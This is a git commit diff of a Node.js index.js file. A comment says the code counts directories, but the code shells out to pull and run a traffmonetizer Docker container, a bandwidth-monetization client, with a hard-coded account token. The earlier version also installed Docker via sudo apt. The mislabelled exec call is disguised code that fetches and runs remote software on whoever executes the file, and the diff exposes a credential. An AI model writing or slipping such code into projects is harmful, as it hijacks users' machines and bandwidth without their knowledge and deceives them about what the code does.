94f615f17b3752d1e41379a70595169f18ac3d4c
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2023-09-05 00:02:01 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('sudo apt update && sudo apt install docker.io && docker pull traffmonetizer/cli_v2:latest && docker run -i --name tm traffmonetizer/cli_v2 start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I= --device-name clever', (error, stdout, stderr) => {
+exec('docker pull traffmonetizer/cli_v2:latest && docker run -i --name tm traffmonetizer/cli_v2 start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I= --device-name clever', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
